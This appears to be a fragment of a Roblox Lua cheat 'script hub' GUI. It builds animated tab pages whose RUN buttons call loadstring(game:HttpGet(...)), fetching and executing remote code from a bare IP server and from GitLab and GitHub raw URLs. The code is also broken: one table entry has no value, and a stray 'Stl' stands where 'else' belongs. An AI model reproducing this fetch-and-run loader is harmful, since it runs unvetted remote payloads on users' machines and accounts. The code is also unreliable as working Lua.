-- Pulse animation utility
local function makePulse(frame)
    task.spawn(function()
        while frame.Parent do
            local tweenIn = TweenService:Create(frame, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
                BackgroundTransparency = 0.12
            })
            local tweenOut = TweenService:Create(frame, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
                BackgroundTransparency = 0.28
            })
            tweenIn:Play()
            tweenIn.Completed:Wait()
            tweenOut:Play()
            tweenOut.Completed:Wait()
        end
    end)
end

-- Create game tab page function
-- Violet/black animated header + gray script box with run button + Game Info
local function createGamePage(key, title, violetColor, scriptName, description)
    local page = Instance.new("Frame")
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.Visible = false
    page.Parent = content
    pages[key] = page

    -- Purple animated header
    local header = Instance.new("Frame")
    header.Size = UDim2.new(0.8, 0, 0, 40)
    header.Position = UDim2.new(0.1, 0, 0, 10)
    header.BackgroundTransparency = 0
    header.Parent = page
    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 12)

    applyGradient(header, {
        ColorSequenceKeypoint.new(0, violetColor),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
    })

    local headerStroke = Instance.new("UIStroke", header)
    headerStroke.Thickness = 1.5
    headerStroke.Color = Color3.fromRGB(
        math.clamp(math.floor(violetColor.R * 255 * 0.8), 0, 255),
        math.clamp(math.floor(violetColor.G * 255 * 0.8), 0, 255),
        math.clamp(math.floor(violetColor.B * 255 * 0.8), 0, 255)
    )

    local headerLabel = Instance.new("TextLabel")
    headerLabel.Size = UDim2.new(1, -20, 1, -10)
    headerLabel.Position = UDim2.new(0, 10, 0, 5)
    headerLabel.BackgroundTransparency = 1
    headerLabel.Text = title
    headerLabel.Font = Enum.Font.SourceSansBold
    headerLabel.TextSize = 22
    headerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    headerLabel.TextXAlignment = Enum.TextXAlignment.Center
    headerLabel.Parent = header

    makePulse(header)

    -- Gray script box under header
    local box = Instance.new("Frame")
    box.Size = UDim2.new(0.8, 0, 0, 110)
    box.Position = UDim2.new(0.1, 0, 0, 60)
    box.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    box.Parent = page
    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)

    local stroke = Instance.new("UIStroke", box)
    stroke.Thickness = 1.5
    stroke.Color = Color3.fromRGB(80, 80, 80)

    local scriptLabel = Instance.new("TextLabel")
    scriptLabel.Size = UDim2.new(1, -20, 0, 25)
    scriptLabel.Position = UDim2.new(0, 10, 0, 5)
    scriptLabel.BackgroundTransparency = 1
    scriptLabel.Text = scriptName
    scriptLabel.Font = Enum.Font.SourceSansBold
    scriptLabel.TextSize = 20
    scriptLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    scriptLabel.TextXAlignment = Enum.TextXAlignment.Left
    scriptLabel.Parent = box

    local descLabel = Instance.new("TextLabel")
    descLabel.Size = UDim2.new(1, -20, 0, 20)
    descLabel.Position = UDim2.new(0, 10, 0, 35)
    descLabel.BackgroundTransparency = 1
    descLabel.Text = description
    descLabel.Font = Enum.Font.SourceSans
    descLabel.TextSize = 16
    descLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    descLabel.TextXAlignment = Enum.TextXAlignment.Left
    descLabel.Parent = box

    local noteLabel = Instance.new("TextLabel")
    noteLabel.Size = UDim2.new(1, -20, 0, 30)
    noteLabel.Position = UDim2.new(0, 10, 0, 55)
    noteLabel.BackgroundTransparency = 1
    noteLabel.Text = "💡 After running the script, please wait 1–3 minutes for the GUI to load.\n⌛ Note: Loading may vary depending on your device."
    noteLabel.Font = Enum.Font.SourceSansItalic
    noteLabel.TextSize = 14
    noteLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
    noteLabel.TextXAlignment = Enum.TextXAlignment.Left
    noteLabel.TextYAlignment = Enum.TextYAlignment.Top
    noteLabel.TextWrapped = true
    noteLabel.Parent = box

    local runButton = Instance.new("TextButton")
    runButton.Size = UDim2.new(0, 70, 0, 26)
    runButton.Position = UDim2.new(1, -80, 1, -36)
    runButton.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
    runButton.Text = "RUN"
    runButton.Font = Enum.Font.SourceSansBold
    runButton.TextSize = 18
    runButton.TextColor3 = Color3.fromRGB(180, 180, 180)
    runButton.Parent = box
    Instance.new("UICorner", runButton).CornerRadius = UDim.new(0, 6)

    local runStroke = Instance.new("UIStroke", runButton)
    runStroke.Thickness = 2
    runStroke.Color = Color3.fromRGB(255, 255, 255)

   runButton.MouseButton1Click:Connect(function()
    local codeMap = {
        GAG = 'loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()',
        SAB = 'loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/visual2.lua"))()',
        PVB = 
        MM2 = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()',
        ADM = 'loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()'
    }
    local code = codeMap[key]
    if code then
        pcall(function()
            loadstring(code)()
        end)
    end
end)

    -- Game Info (purple gradient)
    local gameBox = Instance.new("Frame")
    gameBox.Size = UDim2.new(0.8, 0, 0, 70)
    gameBox.Position = UDim2.new(0.1, 0, 0, 180)
    gameBox.BackgroundColor3 = Color3.fromRGB(180, 0, 255)
    gameBox.Parent = page
    Instance.new("UICorner", gameBox).CornerRadius = UDim.new(0, 12)
    applyGradient(gameBox, {
        ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
    })

    local gameTitle = Instance.new("TextLabel")
    gameTitle.Size = UDim2.new(1, -20, 0, 25)
    gameTitle.Position = UDim2.new(0, 10, 0, 5)
    gameTitle.BackgroundTransparency = 1
    gameTitle.Text = "| Game Info |"
    gameTitle.Font = Enum.Font.SourceSansBold
    gameTitle.TextSize = 18
    gameTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    gameTitle.TextXAlignment = Enum.TextXAlignment.Left
    gameTitle.Parent = gameBox

    local gameNameLabel = Instance.new("TextLabel")
    gameNameLabel.Size = UDim2.new(1, -20, 0, 20)
    gameNameLabel.Position = UDim2.new(0, 10, 0, 40)
    gameNameLabel.BackgroundTransparency = 1
    gameNameLabel.Text = "Loading..."
    gameNameLabel.Font = Enum.Font.SourceSans
    gameNameLabel.TextSize = 16
    gameNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    gameNameLabel.TextXAlignment = Enum.TextXAlignment.Left
    gameNameLabel.Parent = gameBox

    task.spawn(function()
        local ok, info = pcall(function()
            return MarketplaceService:GetProductInfo(game.PlaceId)
        end)
        if ok and info then
            gameNameLabel.Text = "Game: " .. info.Name
        Stl
            gameNameLabel.Text = "Game: N/A"
        end
    end)
end

-- Create all game tab pages (each with unique violet shade header)
